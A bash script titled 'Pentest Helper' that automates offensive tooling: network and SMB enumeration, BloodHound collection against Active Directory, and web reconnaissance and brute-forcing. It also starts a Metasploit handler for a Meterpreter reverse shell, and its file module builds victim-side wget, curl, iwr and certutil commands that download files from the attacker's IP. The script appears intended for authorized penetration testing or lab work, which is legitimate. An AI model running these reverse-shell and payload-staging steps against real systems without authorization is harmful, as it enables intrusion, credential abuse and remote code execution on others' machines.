#!/bin/bash

# ==============================================================================
# PENTEST HELPER - COMBINED TOOL (v2.0)
# ==============================================================================

# --- GLOBAL CONFIGURATION (Adjust these if needed) ---
# Users can override these by exporting them before running the script
: "${SECLISTS_DIR:=/usr/share/seclists}"
WORDLIST_DIR="${SECLISTS_DIR}/Discovery/Web-Content/directory-list-2.3-medium.txt"
WORDLIST_SUBDOMAIN="${SECLISTS_DIR}/Discovery/DNS/subdomains-top1million-5000.txt"
WORDLIST_VHOST="${SECLISTS_DIR}/Discovery/DNS/subdomains-top1million-20000.txt"

# --- GLOBAL COLORS ---
C_HEADER='\033[95m'
C_OKCYAN='\033[96m'
C_OKGREEN='\033[92m'
C_WARNING='\033[93m'
C_FAIL='\033[91m'
C_ENDC='\033[0m'
C_BOLD='\033[1m'

# --- GLOBAL UTILITIES ---

# Helper to print status
log_info() { echo -e "${C_OKCYAN}[*] $1${C_ENDC}"; }
log_success() { echo -e "${C_OKGREEN}[+] $1${C_ENDC}"; }
log_warn() { echo -e "${C_WARNING}[!] $1${C_ENDC}"; }
log_error() { echo -e "${C_FAIL}[-] $1${C_ENDC}"; }

# Unified Clipboard Helper
copy_to_clipboard() {
    local cmd="$1"
    if command -v xclip &>/dev/null; then
        echo -n "$cmd" | xclip -selection clipboard
        log_success "Command copied to clipboard (xclip)."
    elif command -v xsel &>/dev/null; then
        echo -n "$cmd" | xsel --clipboard --input
        log_success "Command copied to clipboard (xsel)."
    elif command -v pbcopy &>/dev/null; then
        echo -n "$cmd" | pbcopy
        log_success "Command copied to clipboard (pbcopy)."
    elif command -v clip.exe &>/dev/null; then
        echo -n "$cmd" | clip.exe
        log_success "Command copied to clipboard (Windows/WSL)."
    else
        log_warn "Clipboard tool not found. Command:"
        echo "$cmd"
    fi
}

# Unified IP Detection
get_ip_address() {
    local iface=$1
    if command -v ip &>/dev/null; then
        ip -4 addr show "$iface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1
    elif command -v ifconfig &>/dev/null; then
        ifconfig "$iface" 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | head -n1
    else
        echo ""
    fi
}

# Execute Command Safe (Replaces eval)
# Usage: execute_cmd <clipboard_bool> <command_array>
execute_cmd() {
    local copy_only=$1
    shift
    local cmd_array=("$@")
    
    # Convert array to string for display/clipboard
    local cmd_str="${cmd_array[*]}"

    if [ "$copy_only" = true ]; then
        copy_to_clipboard "$cmd_str"
    else
        log_info "Running: $cmd_str"
        "${cmd_array[@]}"
    fi
}

# Check if a tool exists
require_tool() {
    if ! command -v "$1" &> /dev/null; then
        log_error "Tool '$1' is required but not installed/found in PATH."
        exit 1
    fi
}

# ==============================================================================
# MODULE 1: INFRA (--infra)
# ==============================================================================
module_infra() {
    local INTERFACE="tun0"
    local PORT=4444
    local PAYLOAD="windows/meterpreter/reverse_tcp"
    local CLIPBOARD=false
    local USERPASS=""
    local USERNAME=""
    local PASSWORD=""
    local DOMAIN=""
    
    local ACTIONS=()
    local TARGET=""

    # Infra Usage
    usage_infra() {
        echo -e "${C_BOLD}Infra Usage:${C_ENDC} $0 --infra [options] <target>"
        echo "Options:"
        echo "  -nmap           Run Nmap scan"
        echo "  -rust           Run Rustscan"
        echo "  -smb-c          Run smbclient"
        echo "  -smb-m          Run smbmap"
        echo "  -enum4          Run enum4linux-ng"
        echo "  -nxc            Run NetExec SMB"
        echo "  -bloodhound     Run BloodHound-CE"
        echo "  -ftp            Run FTP enum"
        echo "  -msf            Start msfconsole handler"
        echo "  -rdp            Run RDP"
        echo "  -ssh            Run SSH"
        echo "  -U user:pass    Credentials (e.g., admin:password123)"
        echo "  -d domain       Domain name"
        echo "  -i iface        Interface (default: tun0)"
        echo "  -p port         LPORT (default: 4444)"
        echo "  -c              Copy command only (Dry Run)"
        exit 1
    }

    if [ $# -lt 1 ]; then usage_infra; fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help) usage_infra ;;
            -smb-c) ACTIONS+=("smbclient") ;;
            -smb-m) ACTIONS+=("smbmap") ;;
            -enum4) ACTIONS+=("enum4linux") ;;
            -nxc) ACTIONS+=("nxc") ;;
            -bloodhound) ACTIONS+=("bloodhound") ;;
            -ftp) ACTIONS+=("ftp") ;;
            -msf) ACTIONS+=("msf") ;;
            -nmap) ACTIONS+=("nmap") ;;
            -rust) ACTIONS+=("rust") ;;
            -rdp) ACTIONS+=("rdp") ;;
            -ssh) ACTIONS+=("ssh") ;;
            -U) 
                USERPASS=$2
                USERNAME="${USERPASS%%:*}"
                PASSWORD="${USERPASS#*:}"
                shift 
                ;;
            -i) INTERFACE=$2; shift ;;
            -p) PORT=$2; shift ;;
            -P) PAYLOAD=$2; shift ;;
            -c) CLIPBOARD=true ;;
            -d) DOMAIN=$2; shift ;;
            -*) log_error "Unknown infra option: $1"; usage_infra ;;
            *)
                if [ -z "$TARGET" ]; then TARGET="$1"
                else log_error "Multiple targets specified: $1"; usage_infra; fi
                ;;
        esac
        shift
    done

    if [ -z "$TARGET" ]; then log_error "Target not specified."; usage_infra; fi

    # --- Execution Logic ---
    for action in "${ACTIONS[@]}"; do
        case $action in
            smbclient)
                local cmd=("smbclient" "-L" "//$TARGET/")
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
                    cmd+=("-U" "$USERNAME%$PASSWORD")
                else
                    cmd+=("-N")
                fi
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            smbmap)
                local cmd=("smbmap" "-H" "$TARGET")
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
                    cmd+=("-u" "$USERNAME" "-p" "$PASSWORD")
                else
                    cmd+=("-u" "null" "-p" "null")
                fi
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            enum4linux)
                local cmd=("enum4linux-ng" "-A")
                [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && cmd+=("-u" "$USERNAME" "-p" "$PASSWORD")
                cmd+=("$TARGET")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            nxc)
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
                    execute_cmd "$CLIPBOARD" "nxc" "smb" "$TARGET" "-u" "$USERNAME" "-p" "$PASSWORD"
                else
                    log_warn "NetExec requires credentials (-U)."
                fi
                ;;
            bloodhound)
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && [ -n "$DOMAIN" ]; then
                    execute_cmd "$CLIPBOARD" "bloodhound-ce-python" "-u" "$USERNAME" "-p" "$PASSWORD" "-ns" "$TARGET" "-d" "$DOMAIN" "-c" "all"
                else
                    log_warn "BloodHound requires user, pass (-U) and domain (-d)."
                fi
                ;;
            ftp)
                local u="anonymous" p="anonymous"
                [ -n "$USERNAME" ] && u="$USERNAME"
                [ -n "$PASSWORD" ] && p="$PASSWORD"
                execute_cmd "$CLIPBOARD" "lftp" "-u" "$u,$p" "ftp://$TARGET"
                ;;
            msf)
                local ip=$(get_ip_address "$INTERFACE")
                if [ -z "$ip" ]; then log_error "No IP on $INTERFACE"; exit 1; fi
                # MSF is tricky with arrays due to internal quotes, treating as string for MSF specific arg
                local msf_cmd="use exploit/multi/handler; set payload $PAYLOAD; set LHOST $ip; set LPORT $PORT; run"
                execute_cmd "$CLIPBOARD" "msfconsole" "-q" "-x" "$msf_cmd"
                ;;
            nmap)
                execute_cmd "$CLIPBOARD" "nmap" "-sV" "-sC" "-Pn" "-v" "$TARGET"
                ;;
            rust)
                execute_cmd "$CLIPBOARD" "rustscan" "-a" "$TARGET" "--ulimit" "5000"
                ;;
            rdp)
                local dir=$(pwd)
                local cmd=("xfreerdp3" "/v:$TARGET" "+clipboard" "/dynamic-resolution" "/drive:share,$dir")
                [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && cmd+=("/u:$USERNAME" "/p:$PASSWORD")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            ssh)
                if [ -z "$USERNAME" ]; then log_error "SSH requires -U user:pass"; exit 1; fi
                execute_cmd "$CLIPBOARD" "sshpass" "-p" "$PASSWORD" "ssh" "$USERNAME@$TARGET"
                ;;
        esac
    done
}

# ==============================================================================
# MODULE 2: FILE (--file)
# ==============================================================================
module_file() {
    local SAVE_FILE=false
    local TOOL="wget"
    local SERVER="http"
    local INTERFACE=""
    local FILENAME=""

    usage_file() {
        echo -e "${C_BOLD}File Usage:${C_ENDC} $0 --file [options] <interface> <filename>"
        echo "Options:"
        echo "  -w            Add output flag (-O/-o)"
        echo "  -t <tool>     wget | curl | iwr | certutil (default: wget)"
        echo "  -s <server>   http | smb (default: http)"
        exit 1
    }

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help) usage_file ;;
            -w) SAVE_FILE=true ;;
            -t) TOOL="$2"; shift ;;
            -s) SERVER="$2"; shift ;;
            -*) log_error "Unknown file option: $1"; usage_file ;;
            *)
                if [ -z "$INTERFACE" ]; then INTERFACE="$1"
                elif [ -z "$FILENAME" ]; then FILENAME="$1"
                else log_error "Too many arguments"; usage_file; fi
                ;;
        esac
        shift
    done

    if [ -z "$INTERFACE" ] || [ -z "$FILENAME" ]; then usage_file; fi

    local IP_ADDR=$(get_ip_address "$INTERFACE")
    if [ -z "$IP_ADDR" ]; then
        log_error "Could not find IP address for interface $INTERFACE"
        exit 1
    fi

    local cmd_arr=()
    case "$TOOL" in
        wget)
            cmd_arr=("wget" "http://$IP_ADDR:8000/$FILENAME")
            [ "$SAVE_FILE" = true ] && cmd_arr+=("-O" "$FILENAME")
            ;;
        curl)
            if [ "$SAVE_FILE" = true ]; then
                cmd_arr=("curl" "http://$IP_ADDR:8000/$FILENAME" "-o" "$FILENAME")
            else
                cmd_arr=("curl" "-O" "http://$IP_ADDR:8000/$FILENAME")
            fi
            ;;
        iwr)
            cmd_arr=("iwr" "http://$IP_ADDR:8000/$FILENAME" "-OutFile" "$FILENAME")
            ;;
        certutil)
            cmd_arr=("certutil" "-urlcache" "-split" "-f" "http://$IP_ADDR:8000/$FILENAME" "$FILENAME")
            ;;
        *) log_error "Invalid tool. Options: wget, curl, iwr, certutil"; exit 1 ;;
    esac

    # Just print/copy the download command, don't execute it (since it's for the victim)
    copy_to_clipboard "${cmd_arr[*]}"

    log_info "Starting $SERVER server on $INTERFACE ($IP_ADDR)..."
    if [ "$SERVER" = "http" ]; then
        log_info "Press Ctrl+C to stop the server."
        python3 -m http.server 8000
    elif [ "$SERVER" = "smb" ]; then
        require_tool "impacket-smbserver"
        sudo impacket-smbserver share . -smb2support
    else
        log_error "Invalid server type."
        exit 1
    fi
}

# ==============================================================================
# MODULE 3: WEB (--web)
# ==============================================================================
module_web() {
    local TARGET=""
    local SCAN_MODE=""
    local OUTPUT_ENABLED=false
    local COPY_COMMAND=false
    local PORT=""

    usage_web() {
        echo -e "${C_BOLD}Web Usage:${C_ENDC} $0 --web <target> [scan_flag]"
        echo "Flags:"
        echo "  --all                Full workflow (Subfinder -> HTTPX)"
        echo "  -subfinder           Passive Subdomain"
        echo "  -gobuster-dns        Active Subdomain"
        echo "  -httpx               Web Server Validation"
        echo "  -subzy               Takeover"
        echo "  -dir                 Dir Bruteforce"
        echo "  -nuclei              Vuln Scan"
        echo "  -zap                 OWASP ZAP"
        echo "  -output              Enable file output"
        echo "  -c                   Copy command only"
        exit 1
    }

    if [ $# -lt 1 ]; then usage_web; fi

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -h|--help) usage_web ;;
            -all|--all) SCAN_MODE="all" ;;
            -subfinder|--subfinder) SCAN_MODE="subfinder" ;;
            -gobuster-dns|--gobuster-dns) SCAN_MODE="gobuster-dns" ;;
            -gobuster-vhost|--gobuster-vhost) SCAN_MODE="gobuster-vhost" ;;
            -dns|--dns) SCAN_MODE="dns" ;;
            -ffuf-vhost|--ffuf-vhost) SCAN_MODE="vhost" ;;
            -httpx|--httpx) SCAN_MODE="httpx" ;;
            -subzy|--subzy) SCAN_MODE="subzy" ;;
            -katana|--katana) SCAN_MODE="katana" ;;
            -dir|--dir) SCAN_MODE="dir" ;;
            -nuclei|--nuclei) SCAN_MODE="nuclei" ;;
            -zap|--zap) SCAN_MODE="zap" ;;
            -waf|--waf) SCAN_MODE="waf" ;;
            -screenshots|--screenshots) SCAN_MODE="screenshots" ;;
            -tech|--tech) SCAN_MODE="tech" ;;
            -output|--output) OUTPUT_ENABLED=true ;;
            -c) COPY_COMMAND=true ;;
            -*) log_error "Unknown web arg: $1"; usage_web ;;
            *)
                if [ -z "$TARGET" ]; then
                    TARGET="$1"
                    if [[ "$TARGET" =~ :([0-9]+)$ ]]; then
                        PORT="${BASH_REMATCH[1]}"
                        TARGET=$(echo "$TARGET" | sed -E 's/:[0-9]+$//')
                    fi
                    TARGET=$(echo "$TARGET" | sed -E 's/^(http|https):\/\///i')
                else
                    log_error "Multiple targets specified: $1"; usage_web
                fi
                ;;
        esac
        shift
    done

    if [ -z "$TARGET" ]; then log_error "Target required"; usage_web; fi
    if [ -z "$SCAN_MODE" ]; then log_error "Scan mode required"; usage_web; fi

    get_url() { [[ "$TARGET" =~ ^https:// ]] && echo "https://$TARGET" || echo "http://$TARGET"; }
    local URL=$(get_url)
    [ -n "$PORT" ] && URL="${URL}:${PORT}"

    local cmd=()

    case "$SCAN_MODE" in
        "subfinder")
            cmd=("subfinder" "-d" "$TARGET")
            $OUTPUT_ENABLED && cmd+=("-o" "subfinder_output.txt")
            ;;
        "gobuster-dns")
            require_tool "gobuster"
            cmd=("gobuster" "dns" "-d" "$TARGET" "-w" "$WORDLIST_SUBDOMAIN")
            $OUTPUT_ENABLED && cmd+=("-o" "gobuster_subdomain_output.txt")
            ;;
        "dns")
            cmd=("dnsrecon" "-d" "$TARGET" "-t" "brf" "-w" "$WORDLIST_SUBDOMAIN" "-f" "-n" "8.8.8.8")
            $OUTPUT_ENABLED && cmd+=("-j" "dnsrecon_output.json")
            ;;
        "httpx")
            cmd=("httpx" "-u" "$URL")
            [ -n "$PORT" ] && cmd+=("-p" "$PORT")
            $OUTPUT_ENABLED && cmd+=("-o" "httpx_output.txt")
            ;;
        "vhost")
            cmd=("ffuf" "-u" "$URL" "-H" "Host:FUZZ.$TARGET" "-w" "$WORDLIST_VHOST" "-ic")
            $OUTPUT_ENABLED && cmd+=("-o" "ffuf_vhost_output.txt")
            ;;
        "dir")
            cmd=("ffuf" "-u" "$URL/FUZZ" "-w" "$WORDLIST_DIR" "-ic")
            $OUTPUT_ENABLED && cmd+=("-o" "ffuf_dir_output.txt")
            ;;
        "nuclei")
            cmd=("nuclei" "-u" "$URL")
            $OUTPUT_ENABLED && cmd+=("-o" "nuclei_output.txt")
            ;;
        "all")
             log_info "[WORKFLOW] Subfinder -> HTTPX"
             cmd1=("subfinder" "-d" "$TARGET" "-o" "subfinder_out.txt")
             cmd2=("httpx" "-l" "subfinder_out.txt" "-o" "httpx_out.txt")
             execute_cmd false "${cmd1[@]}"
             execute_cmd false "${cmd2[@]}"
             return
             ;;
         *)
            # Generic fallback for tools that just take the URL/Target
            # Add specific tools here if they have unique flags
            log_error "Command construction for $SCAN_MODE not fully implemented in refactor"
            exit 1
            ;;
    esac

    execute_cmd "$COPY_COMMAND" "${cmd[@]}"
}

# ==============================================================================
# COMPLETION GENERATOR
# ==============================================================================
generate_completion() {
    cat <<EOF
# Bash Completion for Pentest Helper
_pentest_helper_completion() {
    local cur prev words cword
    _init_completion -n : || return

    local main_opts="--infra --file --web --install-completion"
    local infra_opts="-nmap -rust -smb-c -smb-m -enum4 -nxc -bloodhound -ftp -msf -rdp -ssh -U -d -i -p -P -c"
    local file_opts="-w -t -s"
    local web_opts="--all -subfinder -gobuster-dns -gobuster-vhost -dns -ffuf-vhost -httpx -subzy -katana -dir -nuclei -zap -waf -screenshots -tech -output -c"

    local mode=""
    for ((i=1; i < cword; i++)); do
        if [[ "\${words[i]}" == "--infra" ]]; then mode="infra"; break; fi
        if [[ "\${words[i]}" == "--file" ]]; then mode="file"; break; fi
        if [[ "\${words[i]}" == "--web" ]]; then mode="web"; break; fi
    done

    case "\$mode" in
        infra) COMPREPLY=( \$(compgen -W "\$infra_opts" -- "\$cur") ); return 0 ;;
        file) COMPREPLY=( \$(compgen -W "\$file_opts" -- "\$cur") ); return 0 ;;
        web) COMPREPLY=( \$(compgen -W "\$web_opts" -- "\$cur") ); return 0 ;;
        *) if [[ "\$cur" == -* ]]; then COMPREPLY=( \$(compgen -W "\$main_opts" -- "\$cur") ); fi; return 0 ;;
    esac
}
complete -F _pentest_helper_completion $(basename "$0")
EOF
}

# ==============================================================================
# MAIN DISPATCHER
# ==============================================================================

if [ $# -eq 0 ]; then
    echo -e "${C_BOLD}Pentest Helper Tool${C_ENDC}"
    echo "Usage:"
    echo "  $0 --infra [options] <target>  : Service Enumeration"
    echo "  $0 --file [options] ...        : File Transfer Helper"
    echo "  $0 --web <target> [flags]      : Web Reconnaissance"
    echo "  $0 --install-completion        : Generate bash completion code"
    exit 1
fi

MODE="$1"
case "$MODE" in
    --infra) shift; module_infra "$@" ;;
    --file) shift; module_file "$@" ;;
    --web) shift; module_web "$@" ;;
    --install-completion) generate_completion ;;
    -h|--help) echo "Use --infra, --file, or --web followed by -h for specific help." ;;
    *) log_error "Invalid mode: $MODE. Available: --infra, --file, --web"; exit 1 ;;
esac